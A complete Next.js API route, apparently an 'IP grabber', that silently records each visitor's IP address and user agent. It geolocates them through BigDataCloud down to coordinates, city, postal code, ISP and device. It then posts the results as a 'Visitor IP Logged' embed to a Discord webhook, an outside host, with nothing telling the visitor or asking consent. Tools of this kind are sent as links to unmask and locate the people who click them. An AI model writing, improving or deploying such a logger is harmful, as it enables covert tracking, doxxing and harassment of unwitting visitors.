// /pages/api/ip-logger.js
// Robust single-file IP logger using only BigDataCloud.
// Improved extraction for region, city, ISP, ASN, coords and confidence.

export default async function handler(req, res) {
  // CORS (tighten for production)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    // Get client IP + UA (Vercel-friendly)
    let clientIP = (
      req.headers['x-forwarded-for'] ||
      req.headers['x-real-ip'] ||
      req.socket?.remoteAddress ||
      ''
    ).toString();
    if (!clientIP) clientIP = '0.0.0.0';
    if (clientIP.includes(',')) clientIP = clientIP.split(',')[0].trim();
    clientIP = clientIP.replace(/^::ffff:/, '');

    const userAgent = (req.headers['user-agent'] || 'Unknown').toString();

    // API key
    const KEY = process.env.BIGDATACLOUD_API_KEY;
    if (!KEY) return res.status(500).json({ success: false, error: 'Missing BIGDATACLOUD_API_KEY' });

    const BASE = 'https://api-bdc.net/data';
    const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${KEY}`;

    // Fetch ip-geolocation-full
    let ipData = {};
    try {
      const r = await fetch(GEO_URL);
      const txt = await r.text();
      try { ipData = txt ? JSON.parse(txt) : {}; } catch (e) { ipData = {}; }
      if (!r.ok) console.warn('BigDataCloud non-ok:', r.status, txt);
    } catch (err) {
      console.warn('Fetch error:', err.message);
      ipData = {};
    }

    // Helper: try many candidate paths in ipData (safe, defensive)
    const tryPaths = (...paths) => {
      for (const p of paths) {
        if (!p) continue;
        const parts = p.split('.');
        let cur = ipData;
        let ok = true;
        for (const part of parts) {
          if (cur == null) { ok = false; break; }
          cur = cur[part];
        }
        if (ok && cur !== undefined && cur !== null && cur !== '') return cur;
      }
      return undefined;
    };

    // Bot/datacenter detection
    const isBot = /bot|crawler|spider|preview|screenshot|vercel|uptime|monitor/i.test(userAgent);
    const orgCandidate = String(
      tryPaths(
        'network.organisation',
        'organisation',
        'asnOrganisation',
        'network.name',
        'operator',
        'isp',
        'organisationName',
        'organization'
      ) || ''
    );
    const isDatacenter = /vercel|digitalocean|amazon|google|cloudflare|azure|linode|ovh|hetzner|rackspace|alibaba|microsoft/i.test(orgCandidate.toLowerCase());

    // Coordinates (many variants)
    const lat = numberOrNull( tryPaths('location.latitude', 'latitude', 'location.lat') );
    const lon = numberOrNull( tryPaths('location.longitude', 'longitude', 'location.lon') );

    // REGION extraction: try principalSubdivision, principalSubdivisionCode, localityInfo administrative
    let region = tryPaths('principalSubdivision', 'location.region', 'region', 'principalSubdivisionName', 'principalSubdivisionCode') || null;
    if (!region && ipData?.localityInfo?.administrative && Array.isArray(ipData.localityInfo.administrative)) {
      // prefer adminLevel 4 or order 5 (commonly state)
      const admins = ipData.localityInfo.administrative;
      let candidate = admins.find(a => Number(a.adminLevel) === 4 || Number(a.order) === 5);
      if (!candidate) {
        // fallback: first admin entry that is not country (adminLevel !== 2) and not city (adminLevel >2 and <8)
        candidate = admins.filter(a => Number(a.adminLevel) > 2 && Number(a.adminLevel) < 8)[0];
      }
      if (candidate && candidate.name) region = candidate.name;
    }
    region = region || 'Unknown';

    // CITY extraction: try city/locality and localityInfo administrative (adminLevel 8 or order 7/9)
    let city = tryPaths('city', 'locality', 'location.city') || null;
    if (!city && ipData?.localityInfo?.administrative && Array.isArray(ipData.localityInfo.administrative)) {
      const admins = ipData.localityInfo.administrative;
      let candidate = admins.find(a => Number(a.adminLevel) === 8 || [7,9].includes(Number(a.order)));
      if (!candidate) {
        // fallback: last administrative entry (often the most specific)
        candidate = admins[admins.length - 1];
      }
      if (candidate && candidate.name) city = candidate.name;
    }
    city = city || 'Unknown';

    // Country, continent, postal
    const country = tryPaths('countryName', 'country.name', 'country') || 'Unknown';
    const countryCode = tryPaths('countryCode', 'country.isoAlpha2', 'country.isoCode') || 'Unknown';
    const continent = tryPaths('continent', 'continent.name') || 'Unknown';
    const postal = tryPaths('postcode', 'location.postalCode', 'postalCode') || 'Unknown';

    // Confidence & accuracy radius handling
    let reportedConfidence = tryPaths('confidence', 'location.confidence') || null;
    if (typeof reportedConfidence === 'string') reportedConfidence = reportedConfidence.toLowerCase();
    const reportedRadius = numberOrNull( tryPaths('location.accuracyRadius', 'accuracyRadius') );
    const confidenceArea = tryPaths('confidenceArea', 'location.confidenceArea') || null;
    let computedRadius = null;
    if ((reportedRadius == null) && confidenceArea) {
      try { computedRadius = computeRadiusFromPolygon(confidenceArea); } catch (e) { console.warn('poly->radius fail', e.message); }
    }
    let finalRadius = reportedRadius ?? computedRadius ?? null;
    if (isDatacenter) finalRadius = null; // avoid misleading precision

    // ISP & ASN: try many variants BigDataCloud (or different responses) might use
    const isp = tryPaths(
      'network.carrier.name',
      'isp',
      'network.name',
      'carrier.name',
      'network.carrier',
      'network.isp',
      'connection.isp',
      'operator'
    ) || null;

    const asnRaw = tryPaths(
      'network.autonomousSystemNumber',
      'asn',
      'asnNumeric',
      'network.asn',
      'autonomousSystemNumber',
      'autonomousSystem'
    );
    const asn = asnRaw ? (typeof asnRaw === 'number' ? `AS${asnRaw}` : (String(asnRaw).startsWith('AS') ? String(asnRaw) : `AS${asnRaw}`)) : null;

    // Timezone: try a few possible fields
    const timezoneName = tryPaths('timeZone', 'timezone', 'ianaTimeZone', 'localityInfo.informative.0.name') || null;

    // Build structuredData
    const structuredData = {
      ip: clientIP || 'Unknown',
      timestamp: new Date().toISOString(),
      userAgent,
      location: {
        country,
        countryCode,
        continent,
        region,
        city,
        postalCode: postal,
        latitude: lat != null ? Number(lat) : null,
        longitude: lon != null ? Number(lon) : null,
        reportedAccuracyRadius: reportedRadius != null ? Number(reportedRadius) : null,
        computedAccuracyRadius: computedRadius != null ? Number(computedRadius) : null,
        accuracyRadius: finalRadius != null ? Number(finalRadius) : null,
        accuracyNote: finalRadius && finalRadius > 1000 ? 'Large radius — coarse geolocation or cloud IP' : null,
        confidence: reportedConfidence ?? 'unknown',
        confidenceArea: confidenceArea ?? null,
        localityInfo: ipData?.localityInfo ?? null
      },
      timezone: { name: timezoneName, raw: tryPaths('timeZoneData', 'timezoneData') ?? null },
      network: {
        isp: isp ?? 'Unknown',
        organization: orgCandidate || 'Unknown',
        asn: asn ?? 'Unknown',
        connectionType: tryPaths('network.connectionType', 'connectionType') ?? 'Unknown'
      },
      device: parseUserAgent(userAgent),
      metadata: {
        trafficType: isDatacenter ? 'cloud / proxy' : 'residential',
        isDatacenter,
        isBot,
        rawResponse: process.env.NODE_ENV === 'development' ? ipData : undefined
      }
    };

    // Optional Discord webhook (non-blocking)
    if (process.env.DISCORD_WEBHOOK_URL) {
      sendToDiscord(structuredData).catch(e => console.warn('discord send fail', e.message));
    }

    // Return full structure
    return res.status(200).json({ success: true, data: structuredData });
  } catch (err) {
    console.error('handler err', err);
    return res.status(500).json({ success: false, error: String(err) });
  }
}

/* ---------- Helpers ---------- */

function numberOrNull(v) {
  if (v == null) return null;
  const n = Number(v);
  return Number.isFinite(n) ? n : null;
}

function parseUserAgent(ua) {
  const s = (ua || '').toString();
  let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
  if (/OPR|Opera/.test(s)) browser = 'Opera';
  else if (/Edg\//.test(s)) browser = 'Edge';
  else if (/Chrome\/\d+/i.test(s) && !/Edg\//i.test(s)) browser = 'Chrome';
  else if (/Firefox\/\d+/i.test(s)) browser = 'Firefox';
  else if (/Safari\/\d+/i.test(s) && !/Chrome\//i.test(s)) browser = 'Safari';

  if (/\bWindows\b/i.test(s)) os = 'Windows';
  else if (/\bMacintosh\b|\bMac OS\b/i.test(s)) os = 'Mac OS';
  else if (/\bAndroid\b/i.test(s)) os = 'Android';
  else if (/\b(iPhone|iPad|iPod)\b/i.test(s)) os = 'iOS';
  else if (/\bLinux\b/i.test(s)) os = 'Linux';

  if (/\bMobile\b/i.test(s) || (/Android/i.test(s) && /Mobile/i.test(s))) device = 'Mobile';
  else if (/\bTablet\b/i.test(s) || /iPad/i.test(s)) device = 'Tablet';

  if (/bot|crawler|spider|preview|screenshot|vercel|uptime|monitor/i.test(s)) { browser = 'Bot'; os = 'Server'; device = 'Bot'; }

  return { browser, os, device, raw: s.substring(0, 2000) };
}

/**
 * computeRadiusFromPolygon: accepts polygon formats common from BigDataCloud
 * - array of [lat, lon] or [lon, lat]
 * - array of { latitude, longitude } or { lat, lon }
 * returns km
 */
function computeRadiusFromPolygon(polygon) {
  if (!Array.isArray(polygon) || polygon.length === 0) throw new Error('Invalid polygon');
  const pts = polygon.map(p => {
    if (Array.isArray(p) && p.length >= 2) {
      const a = Number(p[0]), b = Number(p[1]);
      if (!Number.isNaN(a) && Math.abs(a) <= 90 && Math.abs(b) <= 180) return { lat: a, lon: b };
      return { lat: Number(p[1]), lon: Number(p[0]) };
    } else if (p && typeof p === 'object') {
      const lat = numberOrNull(p.latitude ?? p.lat ?? p[1]);
      const lon = numberOrNull(p.longitude ?? p.lon ?? p.lng ?? p[0]);
      if (lat == null || lon == null) throw new Error('Unrecognized polygon point');
      return { lat, lon };
    } else {
      throw new Error('Unrecognized polygon point');
    }
  });

  // centroid
  const centroid = pts.reduce((acc, pt) => { acc.lat += pt.lat; acc.lon += pt.lon; return acc; }, { lat: 0, lon: 0 });
  centroid.lat /= pts.length; centroid.lon /= pts.length;

  // compute max haversine distance
  let maxKm = 0;
  for (const pt of pts) {
    const d = haversineKm(centroid.lat, centroid.lon, pt.lat, pt.lon);
    if (d > maxKm) maxKm = d;
  }
  return Number(maxKm.toFixed(2));
}

function haversineKm(lat1, lon1, lat2, lon2) {
  const toRad = deg => (deg * Math.PI) / 180;
  const R = 6371;
  const dLat = toRad(lat2 - lat1);
  const dLon = toRad(lon2 - lon1);
  const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1))*Math.cos(toRad(lat2))*Math.sin(dLon/2)**2;
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
}

// Minimal Discord sender
async function sendToDiscord(data) {
  const webhook = process.env.DISCORD_WEBHOOK_URL;
  if (!webhook) return;
  const embed = {
    embeds: [{
      title: '🌐 Visitor IP Logged',
      color: 3447003,
      timestamp: data.timestamp,
      fields: [
        { name: 'IP', value: `\`${data.ip}\`` },
        { name: 'Country / Region / City', value: `${data.location.country} / ${data.location.region} / ${data.location.city}` },
        { name: 'Coords', value: data.location.latitude != null && data.location.longitude != null ? `${data.location.latitude}, ${data.location.longitude}` : 'N/A' },
        { name: 'Accuracy (km)', value: data.location.accuracyRadius != null ? `${data.location.accuracyRadius}` : (data.location.computedAccuracyRadius != null ? `${data.location.computedAccuracyRadius} (computed)` : 'N/A') },
        { name: 'Confidence', value: String(data.location.confidence ?? 'unknown').toUpperCase() },
        { name: 'Network', value: `Org: ${data.network.organization}\nISP: ${data.network.isp}\nASN: ${data.network.asn}` },
        { name: 'Device', value: `${data.device.browser} / ${data.device.os} (${data.device.device})` }
      ]
    }]
  };
  await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
      }
